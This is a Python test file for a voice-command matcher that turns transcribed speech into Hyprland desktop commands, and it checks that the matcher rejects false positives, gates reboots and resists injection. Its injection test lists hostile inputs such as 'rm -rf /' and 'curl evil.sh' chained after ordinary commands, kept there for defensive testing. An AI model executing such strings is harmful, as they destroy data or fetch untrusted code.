#!/usr/bin/env python3
"""Tests for the utter grammar and matcher.

Run: python3 tests/test_grammar.py

The matcher is the only part of Utter that decides whether something runs, so
this is where the safety guarantees are pinned down: no false positives on
ordinary speech, no argument injection through slots, and destructive commands
gated behind a confirm.
"""

import importlib.machinery
import importlib.util
import json
import sys
from pathlib import Path

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT / "bin"))

# bin/utter has no .py suffix, so point the loader at it explicitly.
_loader = importlib.machinery.SourceFileLoader("utter", str(ROOT / "bin" / "utter"))
_spec = importlib.util.spec_from_loader("utter", _loader)
utter = importlib.util.module_from_spec(_spec)
_loader.exec_module(utter)

GRAMMAR = json.loads((ROOT / "default" / "commands.json").read_text())
M = utter.Matcher(GRAMMAR)

PASSED = 0
FAILED = []


def check(name, condition, detail=""):
    global PASSED
    if condition:
        PASSED += 1
    else:
        FAILED.append(f"{name}{(': ' + detail) if detail else ''}")


def match(text, threshold=0.80):
    hit, _cleaned = M.match(text, threshold)
    return hit


def expect(text, command_id, run=None):
    hit = match(text)
    if hit is None:
        check(f"{text!r} -> {command_id}", False, "no match")
        return
    check(f"{text!r} -> {command_id}", hit.cmd["id"] == command_id,
          f"got {hit.cmd['id']}")
    if run is not None:
        check(f"{text!r} runs {run!r}", hit.rendered == run, f"got {hit.rendered!r}")


def expect_none(text):
    hit = match(text)
    check(f"{text!r} -> no match", hit is None,
          f"matched {hit.cmd['id']} ({hit.score:.2f})" if hit else "")


# ---- exact phrases across every group ------------------------------------

DSP = "hyprctl dispatch "
expect("focus left", "focus.move", DSP + '\'hl.dsp.focus({ direction = "l" })\'')
expect("focus right", "focus.move", DSP + '\'hl.dsp.focus({ direction = "r" })\'')
expect("go up", "focus.move", DSP + '\'hl.dsp.focus({ direction = "u" })\'')
expect("move window down", "window.move", DSP + '\'hl.dsp.window.swap({ direction = "d" })\'')
expect("close window", "window.close", DSP + "'hl.dsp.window.close()'")
expect("full screen", "window.fullscreen")
expect("float this", "window.float")
expect("center this", "window.center")
expect("pin it", "window.pin")
expect("workspace 3", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "3" })\'')
expect("workspace three", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "3" })\'')
expect("go to workspace 9", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "9" })\'')
expect("next workspace", "workspace.next")
expect("previous workspace", "workspace.prev")
expect("throw this to 5", "workspace.throw", DSP + '\'hl.dsp.window.move({ workspace = "5" })\'')
expect("open the browser", "app.launch", "omarchy launch browser")
expect("launch terminal", "app.launch", "omarchy launch terminal")
expect("show clipboard", "clipboard.open")
expect("volume up", "volume.up")
expect("mute the microphone", "mic.mute")
expect("brighter", "brightness.up")
expect("night light", "nightlight.toggle")
expect("do not disturb", "dnd.toggle")
expect("take a screenshot", "capture.region")
expect("lock the screen", "session.lock", "omarchy system lock")

# ---- phrasings real speech produced that v1 did not cover ------------------
# Every one of these came out of the history file after the first evening of
# using it, transcribed exactly as whisper heard them.

expect("move this window to workspace 4", "workspace.throw",
       DSP + '\'hl.dsp.window.move({ workspace = "4" })\'')
expect("move this window to 4", "workspace.throw")
expect("send this window to workspace 2", "workspace.throw")
expect("move it to workspace 7", "workspace.throw")
expect("focus bottom", "focus.move", DSP + '\'hl.dsp.focus({ direction = "d" })\'')
expect("focus top", "focus.move", DSP + '\'hl.dsp.focus({ direction = "u" })\'')
expect("take me to workspace 5", "workspace.go")
expect("go back", "workspace.former")
expect("make this full screen", "window.fullscreen")

# Every Hyprland command must use the Lua dispatcher API. The bare form
# (`hyprctl dispatch workspace 3`) is accepted by the CLI, rejected by the
# compositor, and looked like success for a whole evening.
for cmd in GRAMMAR["commands"]:
    run = cmd.get("run", "")
    if run.startswith("hyprctl dispatch "):
        check(f"{cmd['id']} uses hl.dsp", "hl.dsp" in run, run)
expect("reboot", "session.reboot")

# ---- homophones whisper genuinely produces -------------------------------

expect("workspace to", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "2" })\'')
expect("workspace for", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "4" })\'')
expect("workspace ate", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "8" })\'')
expect("workspace won", "workspace.go", DSP + '\'hl.dsp.focus({ workspace = "1" })\'')

# ---- transcription noise: punctuation, case, fillers, wake words ----------

expect("Focus left.", "focus.move")
expect("FOCUS LEFT", "focus.move")
expect("  focus   left  ", "focus.move")
expect("um, please close window", "window.close")
expect("can you lock the screen", "session.lock")
expect("omarchy focus right", "focus.move")
expect("computer workspace 4", "workspace.go")
expect("hey omarchy next workspace", "workspace.next")

# ---- mishearings within tolerance ----------------------------------------

expect("focus lefd", "focus.move")
expect("close the windo", "window.close")
expect("vollume up", "volume.up")
expect("next workspase", "workspace.next")
expect("full-screen", "window.fullscreen")

# ---- the safety property: ordinary speech must not trigger anything -------
# This corpus is the kind of thing a hot mic picks up. Every one must be
# rejected, because a false positive here closes someone's window.

for phrase in [
    "banana pancakes",
    "i was thinking about the report we discussed yesterday",
    "yeah that sounds good to me",
    "hold on let me find the file",
    "the weather is really nice today",
    "so anyway what did you think of it",
    "i need to send that email before lunch",
    "did you get a chance to look at the pull request",
    "one two three testing",
    "hello",
    "",
    "   ",
    "thanks",
]:
    expect_none(phrase)

# ---- destructive commands are gated --------------------------------------

for cid in ["session.reboot", "session.shutdown", "session.sleep"]:
    cmd = next(c for c in GRAMMAR["commands"] if c["id"] == cid)
    check(f"{cid} requires confirm", cmd.get("confirm") is True)

# ---- structural integrity -------------------------------------------------

ids = [c["id"] for c in GRAMMAR["commands"]]
check("command ids unique", len(ids) == len(set(ids)),
      f"dupes: {[i for i in ids if ids.count(i) > 1]}")

slots = set(GRAMMAR.get("slots", {}))
for cmd in GRAMMAR["commands"]:
    for template in cmd["say"]:
        for name in utter.Matcher.SLOT_RE.findall(template):
            check(f"{cmd['id']} slot {{{name}}} exists", name in slots)
    for name in utter.Matcher.SLOT_RE.findall(cmd.get("run", "")):
        check(f"{cmd['id']} run slot {{{name}}} exists", name in slots)

check("no command opts into a shell",
      not any(c.get("shell") for c in GRAMMAR["commands"]))

# ---- injection: a slot can only ever be a value from the grammar ----------
# The run line is shlex-split, so the danger would be a slot smuggling extra
# arguments in. Slot values are canonical keys the grammar author wrote, and
# the spoken text is never substituted, so this holds by construction --
# assert it anyway, because it is the whole security model.

for attempt in [
    "workspace 3; rm -rf /",
    "focus left && curl evil.sh",
    "workspace $(whoami)",
    "focus left | tee /tmp/x",
]:
    hit = match(attempt)
    if hit is not None:
        rendered = hit.rendered
        check(f"{attempt!r} cannot inject",
              all(ch not in rendered for ch in [";", "|", "&", "$", "`"]),
              f"rendered {rendered!r}")
    else:
        check(f"{attempt!r} cannot inject", True)

# every slot value that can reach a run line is shell-safe
for slot_name, table in GRAMMAR.get("slots", {}).items():
    for canonical in table:
        check(f"slot {slot_name}={canonical} is safe",
              all(ch not in str(canonical) for ch in [";", "|", "&", "$", "`", " ", "\n"]))

# ---- rendering ------------------------------------------------------------

hit = match("workspace 7")
check("numeric slot labels as a digit", hit and hit.label == "Workspace 7",
      hit.label if hit else "")
hit = match("focus left")
check("word slot labels as a word", hit and hit.label == "Focus left",
      hit.label if hit else "")

# ---- transcript parsing ---------------------------------------------------
# Voxtype puts progress lines on stdout next to the transcript. These are
# verbatim captures from voxtype 0.7.5. The empty-transcript case is the
# dangerous one: before the blank-line rule, "Transcription completed in 1.81s"
# was returned as the transcript and fed straight into the matcher.

SPEECH_OUT = (
    'Loading audio file: "/tmp/a.wav"\n'
    "Audio format: 16000 Hz, 1 channel(s), Int\n"
    "Processing 81600 samples (5.10s)...\n"
    "\n"
    "Ask not what your country can do for you.\n"
)
SILENT_OUT = (
    'Loading audio file: "/tmp/b.wav"\n'
    "Audio format: 16000 Hz, 1 channel(s), Int\n"
    "Processing 93157 samples (5.82s)...\n"
    "\n"
    "\n"
)
VERBOSE_OUT = (
    '\x1b[2m2026-09-03T20:52:41.735778Z\x1b[0m \x1b[32m INFO\x1b[0m '
    'Transcription completed in 1.81s: ""\n'
    "\n"
    "\n"
)

check("transcript: real speech output",
      utter.parse_transcript(SPEECH_OUT) == "Ask not what your country can do for you.",
      repr(utter.parse_transcript(SPEECH_OUT)))
check("transcript: silent audio yields nothing",
      utter.parse_transcript(SILENT_OUT) == "", repr(utter.parse_transcript(SILENT_OUT)))
check("transcript: ANSI log line is not a transcript",
      utter.parse_transcript(VERBOSE_OUT) == "", repr(utter.parse_transcript(VERBOSE_OUT)))
check("transcript: bare line with no blank separator",
      utter.parse_transcript("Focus left.") == "Focus left.")
check("transcript: noise with no blank separator yields nothing",
      utter.parse_transcript("whisper_init_state: kv self size = 6.29 MB") == "")
check("transcript: empty input", utter.parse_transcript("") == "")
check("transcript: whitespace only", utter.parse_transcript("\n  \n\t\n") == "")
check("transcript: multi-line transcript keeps the last line",
      utter.parse_transcript("Processing 1 samples...\n\nfocus left\n") == "focus left")

# The whole point: nothing voxtype prints around a failed transcription may
# reach the matcher.
for noisy in [SILENT_OUT, VERBOSE_OUT, "whisper_init_state: compute buffer = 96 MB\n"]:
    check("no command matches voxtype noise", match(utter.parse_transcript(noisy)) is None)

# ---- normalization helpers ------------------------------------------------

check("normalize strips punctuation", utter.normalize("Focus, left!") == "focus left")
check("normalize keeps digits", utter.normalize("Workspace 3.") == "workspace 3")
check("drop_fillers keeps meaning", utter.drop_fillers("um close window") == "close window")
check("drop_fillers never empties", utter.drop_fillers("please") == "please")
check("strip_leaders", utter.strip_leaders("can you close window") == "close window")

# ---- report ---------------------------------------------------------------

print(f"\n{PASSED} passed, {len(FAILED)} failed")
for f in FAILED:
    print(f"  FAIL  {f}")
sys.exit(1 if FAILED else 0)
